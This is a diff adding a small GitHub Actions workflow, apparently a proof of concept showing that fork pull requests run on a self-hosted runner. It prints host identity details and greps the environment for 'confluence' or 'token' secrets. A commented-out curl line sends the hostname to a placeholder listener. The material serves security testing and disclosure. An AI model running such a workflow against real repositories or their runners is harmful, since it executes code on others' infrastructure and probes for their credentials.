@@ -1,0 +1,13 @@
+name: runner-poc
+on: pull_request
+jobs:
+  poc:
+    runs-on: [self-hosted, sealion]
+    steps:
+      - run: |
+          echo "=== PROOF OF EXECUTION ==="
+          id; hostname; uname -a; pwd
+          echo "--- secrets should be ABSENT for a fork PR ---"
+          env | grep -i -E 'confluence|token' || echo "no secrets exposed (expected)"
+          # egress canary to a listener YOU control (optional):
+          # curl -s https://<your-listener>/poc?host=$(hostname) || true
